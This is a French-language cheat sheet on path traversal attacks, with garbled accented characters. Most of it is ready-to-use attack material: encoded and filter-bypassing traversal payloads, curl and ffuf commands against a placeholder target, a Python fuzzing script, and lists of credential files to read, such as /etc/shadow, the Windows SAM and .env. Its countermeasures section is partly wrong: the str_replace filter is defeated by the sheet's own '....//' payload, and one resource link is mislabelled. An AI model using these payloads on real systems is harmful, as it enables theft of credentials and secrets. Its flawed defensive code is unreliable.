---
title: Path Traversal
date: "2025-07-15"
draft: false
---

# üìÇ Path Traversal - Cheat Sheet

## üéØ Vue d'ensemble
Les vuln√©rabilit√©s de path traversal (ou directory traversal) permettent d'acc√©der √† des fichiers en dehors du r√©pertoire pr√©vu en manipulant les chemins de fichiers.

---

## üîç D√©tection et √ânum√©ration

### Identification des Points d'Entr√©e
```bash
# Param√®tres sensibles √† tester
# Pourquoi : Ces param√®tres sont souvent utilis√©s pour acc√©der aux fichiers
file=document.pdf
page=about.html
include=header.php
load=config.php
path=/var/www/html/
```

### Tests de Base
```bash
# Tests simples de path traversal
# Pourquoi : V√©rifier si l'application est vuln√©rable aux travers√©es de r√©pertoire
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

---

## üõ†Ô∏è Techniques d'Exploitation

### S√©quences de Traversal
```bash
# S√©quences Unix/Linux
# Pourquoi : Naviguer vers les r√©pertoires parents sur les syst√®mes Unix
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd

# S√©quences Windows
# Pourquoi : Naviguer vers les r√©pertoires parents sur Windows
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Encodage et Obfuscation
```bash
# Encodage URL
# Pourquoi : Contourner les filtres qui bloquent les caract√®res sp√©ciaux
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Encodage double
# Pourquoi : Contourner les filtres qui d√©codent une seule fois
..%252F..%252F..%252Fetc%252Fpasswd
..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts

# Encodage hexad√©cimal
# Pourquoi : Utiliser des repr√©sentations hexad√©cimales des caract√®res
..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd
```

### Techniques Avanc√©es
```bash
# Null byte injection
# Pourquoi : Tronquer le chemin apr√®s le null byte
../../../etc/passwd%00.jpg
..\..\..\windows\system32\drivers\etc\hosts%00.txt

# Caract√®res sp√©ciaux
# Pourquoi : Utiliser des caract√®res alternatifs pour les s√©parateurs
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

---

## üåê Exploitation Web

### Param√®tres GET
```bash
# Exemples d'URLs vuln√©rables
# Pourquoi : Tester diff√©rents param√®tres qui peuvent √™tre vuln√©rables
http://target.com/file.php?file=../../../etc/passwd
http://target.com/include.php?page=../../../../etc/passwd
http://target.com/download.php?path=..\..\..\windows\system32\drivers\etc\hosts
```

### Param√®tres POST
```bash
# Requ√™tes POST
# Pourquoi : Tester les param√®tres dans les requ√™tes POST
curl -X POST -d "file=../../../etc/passwd" http://target.com/file.php
curl -X POST -d "include=../../../../etc/passwd" http://target.com/include.php
```

### Headers HTTP
```bash
# Headers personnalis√©s
# Pourquoi : Certaines applications utilisent des headers pour les chemins
curl -H "X-File-Path: ../../../etc/passwd" http://target.com/file.php
curl -H "X-Include-Path: ../../../../etc/passwd" http://target.com/include.php
```

---

## üìÅ Fichiers √† Cibler

### Fichiers Syst√®me Unix/Linux
```bash
# Fichiers de configuration syst√®me
# Pourquoi : Obtenir des informations sensibles sur le syst√®me
/etc/passwd
/etc/shadow
/etc/hosts
/etc/fstab
/etc/motd
/etc/issue

# Fichiers de logs
# Pourquoi : Obtenir des informations sur l'activit√© du syst√®me
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog

# Fichiers de configuration web
# Pourquoi : Obtenir des informations sur la configuration du serveur web
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/php/php.ini
```

### Fichiers Syst√®me Windows
```bash
# Fichiers de configuration Windows
# Pourquoi : Obtenir des informations sur la configuration Windows
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\win.ini
C:\windows\system.ini

# Fichiers de logs Windows
# Pourquoi : Obtenir des informations sur l'activit√© Windows
C:\windows\system32\winevt\logs\Application.evtx
C:\windows\system32\winevt\logs\Security.evtx
C:\windows\system32\winevt\logs\System.evtx
```

### Fichiers d'Application
```bash
# Fichiers de configuration d'application
# Pourquoi : Obtenir des informations sur la configuration de l'application
config.php
config.ini
.env
database.yml
web.config
```

---

## üîß Outils d'Exploitation

### Burp Suite
```bash
# Intercepter et modifier les requ√™tes
# Pourquoi : Analyser et manipuler les param√®tres de chemin
# 1. Intercepter la requ√™te
# 2. Modifier le param√®tre de fichier
# 3. Envoyer la requ√™te modifi√©e

# Exemple de modification
# Param√®tre original: file=document.pdf
# Param√®tre modifi√©: file=../../../etc/passwd
```

### FFUF
```bash
# Fuzzer les chemins
# Pourquoi : Automatiser les tests de path traversal
ffuf -u "http://target.com/file.php?file=FUZZ" \
     -w path-traversal-payloads.txt \
     -mr "root:"

# Liste de payloads
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
```

### Custom Scripts
```python
#!/usr/bin/env python3
# Script de test de path traversal
# Pourquoi : Automatiser les tests de path traversal

import requests

def test_path_traversal(url, param, payloads):
    for payload in payloads:
        params = {param: payload}
        response = requests.get(url, params=params)
        if "root:" in response.text or "error" not in response.text:
            print(f"Vuln√©rable: {payload}")
            print(f"Response: {response.text[:200]}")
```

---

## üéØ Techniques Avanc√©es

### Bypass de Filtres
```bash
# Contourner les filtres de s√©quences
# Pourquoi : √âviter la d√©tection des s√©quences de traversal
....//....//....//etc/passwd
..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd
..%252e%252e%252f..%252e%252e%252f..%252e%252e%252fetc%252fpasswd

# Utiliser des caract√®res Unicode
# Pourquoi : Contourner les filtres qui ne g√®rent pas l'Unicode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
```

### Techniques de Contournement
```bash
# Utiliser des chemins absolus
# Pourquoi : Contourner les restrictions sur les chemins relatifs
/etc/passwd
C:\windows\system32\drivers\etc\hosts

# Utiliser des liens symboliques
# Pourquoi : Acc√©der √† des fichiers via des liens
/var/www/html/symlink -> /etc/passwd
```

---

## üîç Post-Exploitation

### Lecture de Fichiers
```bash
# Lire des fichiers sensibles
# Pourquoi : Obtenir des informations sensibles sur le syst√®me
curl "http://target.com/file.php?file=../../../etc/passwd"
wget "http://target.com/include.php?page=../../../../etc/passwd"

# Lire des fichiers de configuration
# Pourquoi : Obtenir des informations sur la configuration
curl "http://target.com/file.php?file=../../../config.php"
curl "http://target.com/file.php?file=../../../.env"
```

### √ânum√©ration de R√©pertoires
```bash
# Lister les r√©pertoires
# Pourquoi : D√©couvrir la structure du syst√®me de fichiers
curl "http://target.com/file.php?file=../../../"
curl "http://target.com/file.php?file=../../../../"

# Naviguer dans les r√©pertoires
# Pourquoi : Explorer le syst√®me de fichiers
curl "http://target.com/file.php?file=../../../var/www/html/"
curl "http://target.com/file.php?file=../../../home/"
```

---

## üõ°Ô∏è Contre-Mesures

### Validation des Chemins
```php
<?php
// Validation stricte des chemins
// Pourquoi : Emp√™cher l'acc√®s aux fichiers en dehors du r√©pertoire autoris√©
$file = $_GET['file'];
$allowed_path = '/var/www/html/files/';
$real_path = realpath($allowed_path . $file);

if (strpos($real_path, $allowed_path) !== 0) {
    die('Acc√®s non autoris√©');
}
?>
```

### Normalisation des Chemins
```php
<?php
// Normaliser les chemins
// Pourquoi : √âliminer les s√©quences de traversal
$file = $_GET['file'];
$file = str_replace(['../', '..\\'], '', $file);
$file = str_replace(['..%2F', '..%5C'], '', $file);
?>
```

### Configuration Serveur
```apache
# .htaccess pour restreindre l'acc√®s
# Pourquoi : Emp√™cher l'acc√®s aux fichiers sensibles
<Files "*.php">
    Order Deny,Allow
    Deny from all
</Files>

<Files "*.ini">
    Order Deny,Allow
    Deny from all
</Files>
```

---

## üìö Ressources

- **OWASP Path Traversal** : https://owasp.org/www-community/attacks/Path_Traversal
- **HackTricks Path Traversal** : https://book.hacktricks.xyz/pentesting-web/path-traversal
- **PayloadsAllTheThings Path Traversal** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- **Path Traversal Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

---

_Derni√®re mise √† jour : 15 juillet 2025_ 